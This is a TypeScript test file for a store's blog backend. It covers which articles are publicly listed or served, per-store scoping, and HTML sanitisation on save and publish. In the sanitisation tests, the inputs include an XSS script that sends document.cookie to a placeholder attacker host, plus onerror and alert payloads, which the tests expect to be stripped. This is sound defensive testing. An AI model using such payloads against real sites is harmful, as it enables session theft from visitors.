// @vitest-environment edge-runtime
/// <reference types="vite/client" />

/**
 * The public blog, served from the database rather than from a fixture.
 *
 * `/blog` rendered six hard-coded demo posts — Unsplash photography, dates in
 * the future — and linked each of them to a `/blog/[slug]` route that did not
 * exist: twelve dead links on every client site. `listPublishedArticles` had
 * been written and had no callers at all.
 *
 * These pin the queries the storefront now depends on: what a visitor may see,
 * what they may not, and that the HTML reaching their browser has been through
 * the allow-list.
 */

import { convexTest } from "convex-test"
import { describe, expect, test } from "vitest"
import { api } from "../../convex/_generated/api"
import schema from "../../convex/schema"
import type { Id } from "../../convex/_generated/dataModel"
import { saveDraftCore } from "@be-yours/convex-functions/blog"
import { publishArticleCore } from "@be-yours/convex-functions/blogPublish"

const modules = import.meta.glob("../../convex/**/*.ts")

const NOW = 1_800_000_000_000
const AUTHOR = "owner_blog"

type ArticleStatus = "draft" | "scheduled" | "published" | "archived"

function newHarness() {
  return convexTest(schema, modules)
}

async function seedStore(t: ReturnType<typeof convexTest>, slug = "chez-camille") {
  return t.run(async (ctx) =>
    ctx.db.insert("stores", {
      name: "Chez Camille",
      slug,
      address: {
        street: "1 rue de la Paix",
        city: "Paris",
        postalCode: "75002",
        country: "France",
      },
      hours: [],
      status: "open" as const,
      createdAt: NOW,
      updatedAt: NOW,
    }),
  )
}

async function seedCategory(t: ReturnType<typeof convexTest>, storeId: Id<"stores">) {
  return t.run(async (ctx) =>
    ctx.db.insert("blogCategories", {
      storeId,
      name: "Recettes",
      slug: "recettes",
      sortOrder: 0,
      createdAt: NOW,
      updatedAt: NOW,
    }),
  )
}

async function seedArticle(
  t: ReturnType<typeof convexTest>,
  args: {
    storeId: Id<"stores">
    categoryId: Id<"blogCategories">
    title: string
    slug: string
    status: ArticleStatus
    publishedAt?: number
    content?: string
  },
) {
  const content = args.content ?? "<p>Une recette de saison.</p>"
  const payload = {
    title: args.title,
    slug: args.slug,
    excerpt: "Un extrait.",
    content,
    updatedAt: NOW,
  }
  const published = args.status === "published" || args.status === "archived"

  return t.run(async (ctx) =>
    ctx.db.insert("blogArticles", {
      storeId: args.storeId,
      status: args.status,
      hasUnpublishedChanges: !published,
      draftSlug: args.slug,
      draftCategoryId: args.categoryId,
      draftAuthorId: AUTHOR,
      draftContent: payload,
      ...(published
        ? {
            publishedSlug: args.slug,
            publishedCategoryId: args.categoryId,
            publishedAuthorId: AUTHOR,
            publishedContent: payload,
            publishedAt: args.publishedAt ?? NOW,
          }
        : {}),
      createdAt: NOW,
      updatedAt: NOW,
      updatedBy: AUTHOR,
    }),
  )
}

describe("listPublishedArticles", () => {
  test("returns the store's published articles, most recent first", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    await seedArticle(t, { storeId, categoryId, title: "Ancien", slug: "ancien", status: "published", publishedAt: NOW - 86_400_000 })
    await seedArticle(t, { storeId, categoryId, title: "Récent", slug: "recent", status: "published", publishedAt: NOW })

    const articles = await t.query(api.blog.listPublishedArticles, { storeId })

    expect(articles.map((a) => a.title)).toEqual(["Récent", "Ancien"])
  })

  test("shows neither drafts nor articles scheduled but never published", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    await seedArticle(t, { storeId, categoryId, title: "Brouillon", slug: "brouillon", status: "draft" })
    await seedArticle(t, { storeId, categoryId, title: "Planifié", slug: "planifie", status: "scheduled" })
    await seedArticle(t, { storeId, categoryId, title: "En ligne", slug: "en-ligne", status: "published" })

    const articles = await t.query(api.blog.listPublishedArticles, { storeId })

    expect(articles.map((a) => a.title)).toEqual(["En ligne"])
  })

  test("keeps an archived article out of the list", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    await seedArticle(t, { storeId, categoryId, title: "Archivé", slug: "archive", status: "archived" })

    expect(await t.query(api.blog.listPublishedArticles, { storeId })).toHaveLength(0)
  })

  test("never leaks another establishment's articles", async () => {
    const t = newHarness()
    const mine = await seedStore(t, "chez-camille")
    const theirs = await seedStore(t, "chez-lucien")
    const myCategory = await seedCategory(t, mine)
    const theirCategory = await seedCategory(t, theirs)
    await seedArticle(t, { storeId: mine, categoryId: myCategory, title: "À moi", slug: "a-moi", status: "published" })
    await seedArticle(t, { storeId: theirs, categoryId: theirCategory, title: "À eux", slug: "a-eux", status: "published" })

    const articles = await t.query(api.blog.listPublishedArticles, { storeId: mine })

    expect(articles.map((a) => a.title)).toEqual(["À moi"])
  })

  test("honours the limit the teasers pass", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    for (let i = 0; i < 5; i++) {
      await seedArticle(t, { storeId, categoryId, title: `A${i}`, slug: `a-${i}`, status: "published", publishedAt: NOW - i * 1000 })
    }

    expect(await t.query(api.blog.listPublishedArticles, { storeId, limit: 3 })).toHaveLength(3)
  })

  test("carries a reading time the card can show", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    await seedArticle(t, {
      storeId,
      categoryId,
      title: "Long",
      slug: "long",
      status: "published",
      content: `<p>${"mot ".repeat(600)}</p>`,
    })

    const [article] = await t.query(api.blog.listPublishedArticles, { storeId })

    expect(article?.readingMinutes).toBe(3)
  })

  test("a two-line note still reads as one minute, never zero", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    await seedArticle(t, { storeId, categoryId, title: "Court", slug: "court", status: "published", content: "<p>Bref.</p>" })

    const [article] = await t.query(api.blog.listPublishedArticles, { storeId })

    expect(article?.readingMinutes).toBe(1)
  })

  test("names the category so the card can colour it", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    await seedArticle(t, { storeId, categoryId, title: "T", slug: "t", status: "published" })

    const [article] = await t.query(api.blog.listPublishedArticles, { storeId })

    expect(article?.category).toMatchObject({ name: "Recettes", slug: "recettes" })
  })
})

describe("getArticleBySlug", () => {
  test("serves a published article at its own URL", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    await seedArticle(t, { storeId, categoryId, title: "En ligne", slug: "en-ligne", status: "published" })

    const article = await t.query(api.blog.getArticleBySlug, { storeId, slug: "en-ligne" })

    expect(article?.content.title).toBe("En ligne")
    expect(article?.slug).toBe("en-ligne")
  })

  test("refuses a draft — the URL must 404 until it is published", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    await seedArticle(t, { storeId, categoryId, title: "Brouillon", slug: "brouillon", status: "draft" })

    expect(await t.query(api.blog.getArticleBySlug, { storeId, slug: "brouillon" })).toBeNull()
  })

  test("returns null for a slug nobody has published", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)

    expect(await t.query(api.blog.getArticleBySlug, { storeId, slug: "inconnu" })).toBeNull()
  })

  test("is scoped to the establishment asked for", async () => {
    const t = newHarness()
    const mine = await seedStore(t, "chez-camille")
    const theirs = await seedStore(t, "chez-lucien")
    const theirCategory = await seedCategory(t, theirs)
    await seedArticle(t, { storeId: theirs, categoryId: theirCategory, title: "À eux", slug: "partage", status: "published" })

    expect(await t.query(api.blog.getArticleBySlug, { storeId: mine, slug: "partage" })).toBeNull()
  })

  test("keeps an archived article reachable at its URL, as archiving intends", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    await seedArticle(t, { storeId, categoryId, title: "Archivé", slug: "archive", status: "archived" })

    const article = await t.query(api.blog.getArticleBySlug, { storeId, slug: "archive" })

    expect(article?.status).toBe("archived")
  })
})

describe("the article body is sanitised on write", () => {
  test("a script in a hand-authored draft never reaches the database", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    const articleId = await seedArticle(t, { storeId, categoryId, title: "T", slug: "t", status: "draft" })

    await t.run(async (ctx) =>
      saveDraftCore(ctx, {
        articleId,
        draftContent: {
          title: "T",
          slug: "t",
          excerpt: "e",
          content: '<p>ok</p><script>fetch("https://evil.example?c="+document.cookie)</script>',
          updatedAt: NOW,
        },
        categoryId,
        authorId: AUTHOR,
        updatedBy: AUTHOR,
      }),
    )

    const stored = await t.run(async (ctx) => ctx.db.get(articleId))
    expect(stored?.draftContent.content).toBe("<p>ok</p>")
  })

  test("an onerror handler is stripped from an image", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    const articleId = await seedArticle(t, { storeId, categoryId, title: "T", slug: "t", status: "draft" })

    await t.run(async (ctx) =>
      saveDraftCore(ctx, {
        articleId,
        draftContent: {
          title: "T",
          slug: "t",
          excerpt: "e",
          content: '<img src="https://x/y.png" onerror="alert(1)" alt="a" />',
          updatedAt: NOW,
        },
        categoryId,
        authorId: AUTHOR,
        updatedBy: AUTHOR,
      }),
    )

    const stored = await t.run(async (ctx) => ctx.db.get(articleId))
    expect(stored?.draftContent.content).not.toContain("onerror")
  })

  test("publishing cleans a draft that predates the sanitiser", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    // Written straight to the table, the way a row stored before this fix looks.
    const articleId = await seedArticle(t, {
      storeId,
      categoryId,
      title: "Ancien",
      slug: "ancien",
      status: "draft",
      content: '<p>ok</p><script>alert(1)</script>',
    })
    await t.run(async (ctx) => {
      const media = await ctx.db.insert("cmsMedia", {
        storeId,
        kind: "image" as const,
        status: "ready" as const,
        filename: "cover.png",
        mimeType: "image/png",
        size: 1024,
        usageCount: 0,
        uploadedBy: AUTHOR,
        uploadedAt: NOW,
      })
      const article = await ctx.db.get(articleId)
      await ctx.db.patch(articleId, {
        draftContent: { ...article!.draftContent, coverImageId: media },
      })
    })

    await t.run(async (ctx) => publishArticleCore(ctx, articleId, AUTHOR))

    const stored = await t.run(async (ctx) => ctx.db.get(articleId))
    expect(stored?.publishedContent?.content).toBe("<p>ok</p>")
  })

  test("legitimate editor markup survives untouched", async () => {
    const t = newHarness()
    const storeId = await seedStore(t)
    const categoryId = await seedCategory(t, storeId)
    const articleId = await seedArticle(t, { storeId, categoryId, title: "T", slug: "t", status: "draft" })
    const html = "<h2>Titre</h2><p>Un <strong>plat</strong>.</p><ul><li>Un</li></ul>"

    await t.run(async (ctx) =>
      saveDraftCore(ctx, {
        articleId,
        draftContent: { title: "T", slug: "t", excerpt: "e", content: html, updatedAt: NOW },
        categoryId,
        authorId: AUTHOR,
        updatedBy: AUTHOR,
      }),
    )

    const stored = await t.run(async (ctx) => ctx.db.get(articleId))
    expect(stored?.draftContent.content).toBe(html)
  })
})
